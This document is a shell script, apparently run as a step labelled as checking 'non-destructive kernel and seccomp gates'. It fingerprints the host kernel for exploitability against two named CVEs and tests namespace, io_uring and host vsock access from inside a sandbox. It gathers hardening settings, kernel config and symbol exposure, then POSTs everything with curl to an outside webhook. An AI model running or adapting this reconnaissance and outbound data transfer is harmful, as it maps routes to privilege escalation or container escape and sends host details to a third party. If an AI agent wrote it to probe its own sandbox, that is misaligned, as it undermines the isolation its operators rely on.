assets.probe.sh:
#!/bin/sh
set -u

: "${CANARY_URL:?missing disposable webhook}"

probe_dir=$(mktemp -d) || exit 1
[ -n "$probe_dir" ] && [ -d "$probe_dir" ] || exit 1
cleanup() { rm -rf -- "$probe_dir"; }
trap cleanup EXIT HUP INT TERM
kernel_release=$(uname -r 2>/dev/null || true)
kernel_version=$(uname -v 2>/dev/null || true)
kernel_machine=$(uname -m 2>/dev/null || true)

read_number() {
  if [ -r "$1" ]; then
    value=$(head -n 1 "$1" 2>/dev/null | tr -cd '0-9')
    if [ -n "$value" ]; then printf '%s' "$value"; else printf 'null'; fi
  else
    printf 'null'
  fi
}

file_fingerprint() {
  target=$1
  readable=false
  bytes=0
  digest=''
  if [ -r "$target" ]; then
    readable=true
    bytes=$(wc -c <"$target" | tr -d ' ')
    digest=$(sha256sum "$target" 2>/dev/null | awk '{print $1}')
  fi
  jq -cn --argjson readable "$readable" --argjson bytes "$bytes" --arg digest "$digest" \
    '{readable:$readable,bytes:$bytes,sha256:(if $digest=="" then null else $digest end)}'
}

regular_file_fingerprint() {
  target=$1
  readable=false
  bytes=0
  digest=''
  if [ -f "$target" ] && [ -r "$target" ]; then
    bytes=$(stat -Lc '%s' "$target" 2>/dev/null || printf '0')
    case "$bytes" in
      ''|*[!0-9]*) bytes=0 ;;
    esac
    if [ "$bytes" -le 268435456 ]; then
      readable=true
      digest=$(sha256sum "$target" 2>/dev/null | awk '{print $1}')
    fi
  fi
  jq -cn --argjson readable "$readable" --argjson bytes "$bytes" --arg digest "$digest" \
    '{readable:$readable,bytes:$bytes,sha256:(if $digest=="" then null else $digest end),regular_file:true,max_hash_bytes:268435456}'
}

bounded_read_probe() {
  target=$1
  max_bytes=$2
  key=$(printf '%s' "$target" | sha256sum | awk '{print substr($1,1,16)}')
  output="$probe_dir/bounded-$key"
  exists=false
  mode_readable=false
  attempted=false
  succeeded=false
  bytes=0
  digest=''
  if [ -e "$target" ]; then exists=true; fi
  if [ -r "$target" ]; then mode_readable=true; fi
  if [ "$mode_readable" = true ] && command -v timeout >/dev/null 2>&1; then
    attempted=true
    if timeout 2 head -c "$max_bytes" "$target" >"$output" 2>/dev/null; then
      succeeded=true
      bytes=$(wc -c <"$output" | tr -d ' ')
      digest=$(sha256sum "$output" 2>/dev/null | awk '{print $1}')
    fi
  fi
  jq -cn --argjson exists "$exists" --argjson modeReadable "$mode_readable" \
    --argjson attempted "$attempted" --argjson succeeded "$succeeded" \
    --argjson bytes "$bytes" --argjson maxBytes "$max_bytes" --arg digest "$digest" \
    '{exists:$exists,mode_readable:$modeReadable,read_attempted:$attempted,read_succeeded:$succeeded,bytes_read:$bytes,max_bytes:$maxBytes,sha256:(if $digest=="" then null else $digest end)}'
}

compiler_exit=127
outside='null'
io_uring_compiler_exit=127
io_uring_exit=127
io_uring='null'
userns_exit=127
userns='null'
user_netns_exit=127
user_netns='null'

if command -v cc >/dev/null 2>&1; then
  cc -std=c11 -O2 -Wall -Wextra -Werror -o "$probe_dir/kernel-gate-probe" /app/kernel-gate-probe.c >"$probe_dir/cc.out" 2>"$probe_dir/cc.err"
  compiler_exit=$?
  cc -std=c11 -O2 -Wall -Wextra -Werror -o "$probe_dir/io-uring-nop-gate" /app/io-uring-nop-gate.c >"$probe_dir/io-cc.out" 2>"$probe_dir/io-cc.err"
  io_uring_compiler_exit=$?
fi

if [ "$compiler_exit" -eq 0 ]; then
  if [ -r /proc/config.gz ] && gzip -dc /proc/config.gz 2>/dev/null | grep -qx 'CONFIG_IA32_EMULATION=y'; then
    "$probe_dir/kernel-gate-probe" >"$probe_dir/outside.json" 2>/dev/null
  else
    SKIP_COMPAT_VSOCK=1 "$probe_dir/kernel-gate-probe" >"$probe_dir/outside.json" 2>/dev/null
  fi
  if jq -e 'type=="object"' "$probe_dir/outside.json" >/dev/null 2>&1; then
    outside=$(cat "$probe_dir/outside.json")
  fi
fi

if [ "$io_uring_compiler_exit" -eq 0 ]; then
  "$probe_dir/io-uring-nop-gate" >"$probe_dir/io-uring.json" 2>/dev/null
  io_uring_exit=$?
  if jq -e 'type=="object"' "$probe_dir/io-uring.json" >/dev/null 2>&1; then
    io_uring=$(cat "$probe_dir/io-uring.json")
  fi
fi

if [ "$compiler_exit" -eq 0 ] && command -v unshare >/dev/null 2>&1; then
  SKIP_COMPAT_VSOCK=1 unshare --user --map-root-user -- "$probe_dir/kernel-gate-probe" >"$probe_dir/userns.json" 2>"$probe_dir/userns.err"
  userns_exit=$?
  if [ "$userns_exit" -eq 0 ] && jq -e 'type=="object"' "$probe_dir/userns.json" >/dev/null 2>&1; then
    userns=$(cat "$probe_dir/userns.json")
  fi

  SKIP_COMPAT_VSOCK=1 unshare --user --map-root-user --net -- "$probe_dir/kernel-gate-probe" >"$probe_dir/user-netns.json" 2>"$probe_dir/user-netns.err"
  user_netns_exit=$?
  if [ "$user_netns_exit" -eq 0 ] && jq -e 'type=="object"' "$probe_dir/user-netns.json" >/dev/null 2>&1; then
    user_netns=$(cat "$probe_dir/user-netns.json")
  fi
fi

max_user_namespaces=$(read_number /proc/sys/user/max_user_namespaces)
unprivileged_userns_clone=$(read_number /proc/sys/kernel/unprivileged_userns_clone)
apparmor_userns=$(read_number /proc/sys/kernel/apparmor_restrict_unprivileged_userns)
kptr_restrict=$(read_number /proc/sys/kernel/kptr_restrict)
dmesg_restrict=$(read_number /proc/sys/kernel/dmesg_restrict)
io_uring_disabled=$(read_number /proc/sys/kernel/io_uring_disabled)

selected_config='[]'
if [ -r /proc/config.gz ]; then
  selected_config=$(gzip -dc /proc/config.gz 2>/dev/null | \
    grep -E '^(CONFIG_(FUTEX|FUTEX_PI|UNIX|AF_UNIX_OOB|AF_ALG|IPV6|USER_NS|NET_NS|IA32_EMULATION|COMPAT|SECCOMP|SECCOMP_FILTER|IO_URING|PACKET|RANDOMIZE_BASE|RANDOMIZE_KSTACK_OFFSET|RANDOMIZE_KSTACK_OFFSET_DEFAULT|RANDOMIZE_MEMORY|KALLSYMS|KALLSYMS_ALL|SLAB_FREELIST_HARDENED|SLAB_FREELIST_RANDOM|HARDENED_USERCOPY|STACKPROTECTOR_STRONG|CHECKPOINT_RESTORE|COREDUMP|SYSCTL|STATIC_USERMODEHELPER|STATIC_USERMODEHELPER_PATH|X86_KERNEL_IBT|CFI_CLANG|CFI_PERMISSIVE|PAGE_TABLE_ISOLATION|X86_5LEVEL|SMP|NR_CPUS|X86_SMAP|X86_SMEP)=|# CONFIG_(FUTEX|FUTEX_PI|UNIX|AF_UNIX_OOB|AF_ALG|IPV6|USER_NS|NET_NS|IA32_EMULATION|COMPAT|SECCOMP|SECCOMP_FILTER|IO_URING|PACKET|RANDOMIZE_BASE|RANDOMIZE_KSTACK_OFFSET|RANDOMIZE_KSTACK_OFFSET_DEFAULT|RANDOMIZE_MEMORY|KALLSYMS|KALLSYMS_ALL|SLAB_FREELIST_HARDENED|SLAB_FREELIST_RANDOM|HARDENED_USERCOPY|STACKPROTECTOR_STRONG|CHECKPOINT_RESTORE|COREDUMP|SYSCTL|STATIC_USERMODEHELPER|STATIC_USERMODEHELPER_PATH|X86_KERNEL_IBT|CFI_CLANG|CFI_PERMISSIVE|PAGE_TABLE_ISOLATION|X86_5LEVEL|SMP|NR_CPUS|X86_SMAP|X86_SMEP) is not set$)' | \
    LC_ALL=C sort | jq -Rsc 'split("\n")|map(select(length>0))')
  [ -n "$selected_config" ] || selected_config='[]'
fi

kernel_notes_hex=''
if [ -r /sys/kernel/notes ]; then
  kernel_notes_hex=$(od -An -v -tx1 /sys/kernel/notes 2>/dev/null | tr -d ' \n')
fi

config_gz=$(file_fingerprint /proc/config.gz)
config_gz_base64=''
if [ -r /proc/config.gz ]; then
  config_gz_bytes=$(wc -c </proc/config.gz | tr -d ' ')
  case "$config_gz_bytes" in
    ''|*[!0-9]*) config_gz_bytes=0 ;;
  esac
  if [ "$config_gz_bytes" -le 262144 ]; then
    config_gz_base64=$(base64 /proc/config.gz 2>/dev/null | tr -d '\n')
  fi
fi
boot_config=$(file_fingerprint "/boot/config-$kernel_release")
boot_kernel=$(file_fingerprint "/boot/vmlinuz-$kernel_release")
btf=$(file_fingerprint /sys/kernel/btf/vmlinux)
kernel_notes=$(file_fingerprint /sys/kernel/notes)
proc_kallsyms=$(file_fingerprint /proc/kallsyms)
proc_version=$(file_fingerprint /proc/version)
proc_version_text=$(head -c 4096 /proc/version 2>/dev/null || true)
proc_version_signature=$(file_fingerprint /proc/version_signature)
proc_cmdline=$(file_fingerprint /proc/cmdline)
proc_kcore_header=$(bounded_read_probe /proc/kcore 64)
module_source=$(file_fingerprint "/lib/modules/$kernel_release/source/kernel/locking/rtmutex.c")
module_build_source=$(file_fingerprint "/lib/modules/$kernel_release/build/kernel/locking/rtmutex.c")
module_vmlinux=$(regular_file_fingerprint "/lib/modules/$kernel_release/vmlinux")
usr_module_vmlinux=$(regular_file_fingerprint "/usr/lib/modules/$kernel_release/vmlinux")
debug_vmlinux=$(regular_file_fingerprint "/usr/lib/debug/boot/vmlinux-$kernel_release")

remove_waiter='{"present":false,"matches":0,"address_nonzero":false,"line_sha256":null}'
if [ -r /proc/kallsyms ]; then
  awk '$3 ~ /^remove_waiter([.]|$)/ {print; count++; if (count>=16) exit}' /proc/kallsyms >"$probe_dir/remove-waiter.symbols" 2>/dev/null || true
  remove_waiter_matches=$(wc -l <"$probe_dir/remove-waiter.symbols" | tr -d ' ')
  remove_waiter_line_sha=$(sha256sum "$probe_dir/remove-waiter.symbols" 2>/dev/null | awk '{print $1}')
  if [ "$remove_waiter_matches" -gt 0 ]; then
    remove_waiter_nonzero=false
    if awk '$1 !~ /^0+$/ {found=1} END {exit !found}' "$probe_dir/remove-waiter.symbols"; then remove_waiter_nonzero=true; fi
    remove_waiter=$(jq -cn --argjson matches "$remove_waiter_matches" --argjson nonzero "$remove_waiter_nonzero" --arg digest "$remove_waiter_line_sha" \
      '{present:true,matches:$matches,address_nonzero:$nonzero,line_sha256:$digest}')
  fi
fi

livepatch_present=false
livepatch_count=0
livepatch_digest=''
: >"$probe_dir/livepatch-names"
if [ -d /sys/kernel/livepatch ]; then
  livepatch_present=true
  for item in /sys/kernel/livepatch/*; do
    if [ -d "$item" ]; then basename "$item"; fi
  done | LC_ALL=C sort >"$probe_dir/livepatch-names"
  livepatch_count=$(wc -l <"$probe_dir/livepatch-names" | tr -d ' ')
  livepatch_digest=$(sha256sum "$probe_dir/livepatch-names" 2>/dev/null | awk '{print $1}')
fi
livepatch=$(jq -cn --argjson present "$livepatch_present" --argjson count "$livepatch_count" --arg digest "$livepatch_digest" \
  '{directory_present:$present,count:$count,names_sha256:(if $digest=="" then null else $digest end)}')

jq -n \
  --arg ghostlock 'CVE-2026-43499' \
  --arg unixGc 'CVE-2025-40214' \
  --arg kernelRelease "$kernel_release" \
  --arg kernelVersion "$kernel_version" \
  --arg machine "$kernel_machine" \
  --argjson maxUserns "$max_user_namespaces" \
  --argjson unprivUserns "$unprivileged_userns_clone" \
  --argjson apparmorUserns "$apparmor_userns" \
  --argjson kptrRestrict "$kptr_restrict" \
  --argjson dmesgRestrict "$dmesg_restrict" \
  --argjson ioUringDisabled "$io_uring_disabled" \
  --argjson selectedConfig "$selected_config" \
  --arg kernelNotesHex "$kernel_notes_hex" \
  --argjson compilerExit "$compiler_exit" \
  --argjson outside "$outside" \
  --argjson ioUringCompilerExit "$io_uring_compiler_exit" \
  --argjson ioUringExit "$io_uring_exit" \
  --argjson ioUring "$io_uring" \
  --argjson usernsExit "$userns_exit" \
  --argjson userns "$userns" \
  --argjson userNetnsExit "$user_netns_exit" \
  --argjson userNetns "$user_netns" \
  --argjson configGz "$config_gz" \
  --arg configGzBase64 "$config_gz_base64" \
  --argjson bootConfig "$boot_config" \
  --argjson bootKernel "$boot_kernel" \
  --argjson btf "$btf" \
  --argjson kernelNotes "$kernel_notes" \
  --argjson procKallsyms "$proc_kallsyms" \
  --argjson procVersion "$proc_version" \
  --arg procVersionText "$proc_version_text" \
  --argjson procVersionSignature "$proc_version_signature" \
  --argjson procCmdline "$proc_cmdline" \
  --argjson procKcoreHeader "$proc_kcore_header" \
  --argjson removeWaiter "$remove_waiter" \
  --argjson livepatch "$livepatch" \
  --argjson moduleSource "$module_source" \
  --argjson moduleBuildSource "$module_build_source" \
  --argjson moduleVmlinux "$module_vmlinux" \
  --argjson usrModuleVmlinux "$usr_module_vmlinux" \
  --argjson debugVmlinux "$debug_vmlinux" \
  '{candidates:[$ghostlock,$unixGc],kernel:{release:$kernelRelease,version:$kernelVersion,proc_version:(if $procVersionText=="" then null else $procVersionText end),machine:$machine,selected_config:$selectedConfig,kernel_notes_hex:(if $kernelNotesHex=="" then null else $kernelNotesHex end),policy:{kptr_restrict:$kptrRestrict,dmesg_restrict:$dmesgRestrict,io_uring_disabled:$ioUringDisabled},symbols:{remove_waiter:$removeWaiter},livepatch:$livepatch},namespace_policy:{max_user_namespaces:$maxUserns,unprivileged_userns_clone:$unprivUserns,apparmor_restrict_unprivileged_userns:$apparmorUserns},gate_probe:{compiler_exit:$compilerExit,outside:$outside,io_uring_nop:{compiler_exit:$ioUringCompilerExit,exit:$ioUringExit,result:$ioUring},user_namespace:{exit:$usernsExit,result:$userns},user_and_network_namespaces:{exit:$userNetnsExit,result:$userNetns}},artifacts:{proc_config_gz:$configGz,proc_config_gz_base64:(if $configGzBase64=="" then null else $configGzBase64 end),boot_config:$bootConfig,boot_kernel:$bootKernel,btf_vmlinux:$btf,kernel_notes:$kernelNotes,proc_kallsyms:$procKallsyms,proc_version:$procVersion,proc_version_signature:$procVersionSignature,proc_cmdline:$procCmdline,proc_kcore_header:$procKcoreHeader,module_source_rtmutex:$moduleSource,module_build_source_rtmutex:$moduleBuildSource,module_vmlinux:$moduleVmlinux,usr_module_vmlinux:$usrModuleVmlinux,debug_vmlinux:$debugVmlinux},safety:{known_vulnerable_sequence_constructed:false,pi_requeue_waiter_created:false,io_uring_opcode:"IORING_OP_NOP",io_uring_network_operation_attempted:false,kernel_trigger_packet_sent:false,host_vsock_connection_attempted:(if ($outside|type)=="object" then (($outside.socket_af_vsock_i386_socketcall.skipped // true)|not) else false end),host_rpc_sent:false,canary_post_attempted:true,exploit_payload_attempted:false}}' >"$probe_dir/payload.json"

curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null \
  -H 'Content-Type: application/json' --data-binary @"$probe_dir/payload.json" "$CANARY_URL"

commands.customName: Confirm final non-destructive kernel and seccomp gates
